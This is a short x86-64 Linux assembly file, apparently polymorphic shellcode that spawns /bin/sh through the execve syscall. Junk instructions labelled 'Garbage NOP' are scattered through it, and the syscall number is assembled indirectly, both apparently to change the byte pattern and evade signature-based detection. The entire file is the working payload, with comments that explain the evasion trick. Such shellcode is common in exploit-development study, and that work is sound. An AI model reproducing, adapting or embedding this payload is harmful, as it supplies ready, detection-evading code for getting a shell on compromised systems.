global _start

_start:

            cmc                              ; Garbage NOP
            cdq                              ; Garbage NOP

            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8
            xor rsi, rsi                     ; Garbage NOP
            clc                              ; Garbage NOP
            push    rbx
            mov     rdi, rsp

            dec rbp                          ; Garbage NOP

            push    rax
            mul rbp                          ; Garbage NOP
            push    rdi

            lea r10, [rsi - 62]              ; Garbage NOP

            mov     rsi, rsp

            mul r12                          ; Garbage NOP

            lea r9, [rbp + 9]                ; Garbage NOP

            mov cl, 27                       ; Garbage NOP

            push word 0x20                   ; Pushes 0x20 into the stack.
            pop bx                           ; Pops this value into BX.

            mov al, bl                       ; The value in BL is copied into AL.
            add al, 0x1b                     ; As the value of AL is now 0x20, adding 0x1B will set its value to 0x3B, which is the execve syscall value.

            syscall
